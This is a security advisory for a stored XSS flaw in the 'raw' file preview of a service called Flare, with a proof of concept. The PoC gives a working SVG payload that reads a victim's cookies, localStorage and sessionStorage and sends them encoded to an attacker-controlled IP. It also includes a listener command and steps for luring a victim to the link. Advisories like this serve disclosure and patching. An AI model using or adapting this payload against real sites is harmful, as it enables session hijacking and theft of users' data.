# CVE-2026-26993: XSS in Raw File Preview 

| Property | Details |
| :--- | :--- |
| **Service** | Flare |
| **CVSS Score** | 4.6 (Medium) |
| **Published** | February 17, 2026 |
| **Affected** | `<1.7.0`,  |
| **Patched** | `>=1.7.1` |


## Technical Summary

The application allows users to upload files without proper content validation or sanitization. By embedding malicious JavaScript within an SVG (or other active content formats such as HTML or XML), an attacker can achieve script execution in the context of the application's origin when a victim views the file in "raw" mode. This results in a stored Cross-Site Scripting (XSS) vulnerability that can be exploited to exfiltrate user data.

## Proof of Concept

1. Log in to the application using any valid account.
2. Upload a malicious file containing embedded JavaScript payload.
 ```bash
# Change the IP and port and save the file as .svg
<svg xmlns="http://www.w3.org/2000/svg" onload="
    let data = {
        ls: JSON.stringify(localStorage),
        ss: JSON.stringify(sessionStorage),
        cookie: document.cookie
    };
    new Image().src='http://172.17.0.1:80/?data=' + btoa(JSON.stringify(data));
"></svg>
```
    
3. Copy the generated link to the uploaded file and share it with a victim.  
4. Start a listener server to capture exfiltrated data.
```shell
python3 -m http.server 80
```
5. When the victim opens the link and clicks the "Raw" button, the embedded JavaScript executes in the victim’s browser.
6. Sensitive data (e.g., cookies or session information) is sent to the attacker-controlled server, even if the victim does not have an account on the platform.
